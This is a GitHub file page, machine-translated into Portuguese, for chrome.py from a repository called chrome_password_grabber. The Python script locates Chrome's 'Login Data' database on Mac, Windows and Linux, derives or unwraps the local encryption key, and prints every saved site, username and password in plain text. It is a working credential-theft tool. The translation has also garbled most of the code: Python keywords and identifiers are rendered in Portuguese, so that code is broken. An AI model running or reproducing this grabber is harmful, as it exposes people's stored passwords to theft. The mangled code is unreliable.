Ir para o conteúdo
Pesquise ou pule para ...

Solicitação de pull s
questões
Mercado
Explorar
 
@KeyloggerHub 
Priyankchheda
/
chrome_password_grabber
18
505102
Código
questões
6
Solicitações de pull
Ações
Projetos
Wiki
Segurança
Conhecimentos
chrome_password_grabber/ chrome.py /
@priyankchheda
priyankchheda atualizar arquivo README.md e mac requisitos.txt
Último commit 6e4cb7b on 4 Jan
 História
 4 contribuidores
@priyankchheda@ kousha1999@ Mr-xn@ferloopew
157 linhas (134 sloc)  5,28 KB
  
"" "Obtenha 'Senha Salva' não criptografada do Google Chrome
    Plataforma com suporte: Mac, Linux e Windows
"" "
import  json
importar  os
 plataforma de importação
import  sqlite3
importar  string
 subprocesso de importação
from  getpass  import  getuser
de  importlib  import  import_module
de  os  import  unlink
da  cópia de importação do shutil  

import  secretstorage

__author__  =  'Priyank Chheda'
__email__  =  'p.chheda29@gmail.com'


classe  ChromeMac :
    "" "Classe de descriptografia para instalação do Chrome Mac" ""
    def  __init__ ( self ):
        "" "Função de inicialização do Mac" ""
        my_pass  =  subprocesso . Popen (
            "security find-generic-password -wa 'Chrome'" ,
            stdout = subprocesso . PIPE ,
            stderr = subprocesso . PIPE ,
            shell = True )
        stdout , _  =  my_pass . comunicar ()
        my_pass  =  stdout . substituir ( b ' \ n ' , b '' )

        iterações  =  1003
        salt  =  b'saltysalt '
        comprimento  =  16

        kdf  =  import_module ( 'Crypto.Protocol.KDF' )
        eu . chave  =  kdf . PBKDF2 ( my_pass , salt , length , iterações )
        eu . dbpath  = ( f "/ Users / { getuser () } / Library / Application Support /"
                       "Google / Chrome / Padrão /" )

    def  decrypt_func ( self , enc_passwd ):
        "" "Função de descriptografia Mac" ""
        aes  =  import_module ( 'Crypto.Cipher.AES' )
        vetor_de_inicialização  =  b ''  *  16
        enc_passwd  =  enc_passwd [ 3 :]
        cipher  =  aes . novo ( auto . chave , aes . MODE_CBC , IV = initialization_vector )
        descriptografado  =  cifra . descriptografar ( enc_passwd )
        retorno  descriptografado . strip (). decodificar ( 'utf8' )


classe  ChromeWin :
    "" "Classe de descriptografia para instalação do Chrome Windows" ""
    def  __init__ ( self ):
        "" "Função de inicialização do Windows" ""
        # pesquisar o caminho da versão do cromo geral
        win_path  =  f "C: \\ Usuários \\ { getuser () } \\ AppData \\ Local \\ Google"  " \\ {chrome} \\ Dados do usuário \\ Padrão \\ "
        win_chrome_ver  = [
            item  para  item  em
            [ 'chrome' , 'chrome dev' , 'chrome beta' , 'chrome canary' ]
            se  os . caminho . existe ( win_path . format ( chrome = item ))
        ]
        eu . dbpath  =  win_path . formato ( chrome = '' . join ( win_chrome_ver ))
        # self.dbpath = (f "C: \\ Usuários \\ {getuser ()} \\ AppData \\ Local \\ Google"
        # "\\ Chrome \\ Dados do usuário \\ Padrão \\")

    def  decrypt_func ( self , enc_passwd ):
        "" "Função de descriptografia do Windows" ""
        win32crypt  =  import_module ( 'win32crypt' )
        data  =  win32crypt . CryptUnprotectData ( enc_passwd , Nenhum , Nenhum , Nenhum , 0 )
         dados de retorno [ 1 ]. decodificar ( 'utf8' )


classe  ChromeLinux :
    "" "Classe de descriptografia para instalação do Chrome Linux" ""
    def  __init__ ( self ):
        "" "Função de inicialização do Linux" ""
        my_pass  =  'amendoim' . codificar ( 'utf8' )
        bus  =  armazenamento secreto . dbus_init ()
        coleção  =  armazenamento secreto . get_default_collection ( barramento )
        para o  item  na  coleção . get_all_items ():
            se  item . get_label () ==  'Armazenamento seguro do Chrome' :
                my_pass  =  item . get_secret ()
                pausa
        iterações  =  1
        salt  =  b'saltysalt '
        comprimento  =  16

        kdf  =  import_module ( 'Crypto.Protocol.KDF' )
        eu . chave  =  kdf . PBKDF2 ( my_pass , salt , length , iterações )
        eu . dbpath  =  f "/ home / { getuser () } /.config/google-chrome/Default/"

    def  decrypt_func ( self , enc_passwd ):
        "" "Função de descriptografia do Linux" ""
        aes  =  import_module ( 'Crypto.Cipher.AES' )
        vetor_de_inicialização  =  b ''  *  16
        enc_passwd  =  enc_passwd [ 3 :]
        cipher  =  aes . novo ( auto . chave , aes . MODE_CBC , IV = initialization_vector )
        descriptografado  =  cifra . descriptografar ( enc_passwd )
        retorno  descriptografado . strip (). decodificar ( 'utf8' )


classe  Chrome :
    "" "Classe Chrome independente de SO genérico" ""
    def  __init__ ( self ):
        "" "determine em qual plataforma você está" ""
        target_os  =  plataforma . sistema ()
        if  target_os  ==  'Darwin' :
            eu . chrome_os  =  ChromeMac ()
        elif  target_os  ==  'Windows' :
            eu . chrome_os  =  ChromeWin ()
        elif  target_os  ==  'Linux' :
            eu . chrome_os  =  ChromeLinux ()

    @ propriedade
    def  get_login_db ( self ):
        "" "obtendo" Dados de login "caminho do banco de dados sqlite" ""
        retornar a  si mesmo . chrome_os . dbpath

    def  get_password ( self , prettyprint = False ):
        "" "obter URL, nome de usuário e senha em texto não criptografado
            : param prettyprint: se verdadeiro, imprime a senha de texto não criptografado na tela
            : return: limpar dados de texto em formato de dicionário
        "" "
        copy(self.chrome_os.dbpath + "Login Data", "Login Data.db")
        conn = sqlite3.connect("Login Data.db")
        cursor = conn.cursor()
        cursor.execute("""
            SELECT action_url, username_value, password_value
            FROM logins; """)
        data = {'data': []}
        for result in cursor.fetchall():
            _passwd = self.chrome_os.decrypt_func(result[2])
            passwd = ''.join(i for i in _passwd if i in string.printable)
            if result[1] or passwd:
                _data = {}
                _data['url'] = result[0]
                _data['username'] = result[1]
                _data['password'] = passwd
                data['data'].append(_data)
        conn.close()
        unlink("Login Data.db")

        if prettyprint:
            return json.dumps(data, indent=4)
        return data


def main():
    """ Operational Script """
    chrome_pwd  =  Chrome ()
    imprimir ( chrome_pwd . get_login_db )
    chrome_pwd . get_password ( prettyprint = True )


if  __name__  ==  '__main__' :
    principal ()
© 2021 GitHub, Inc.
Termos
Privacidade
Segurança
Status
Docs
Entre em contato com o GitHub
Preços
API
Treinamento
Blog
Cerca de
Carregamento completo
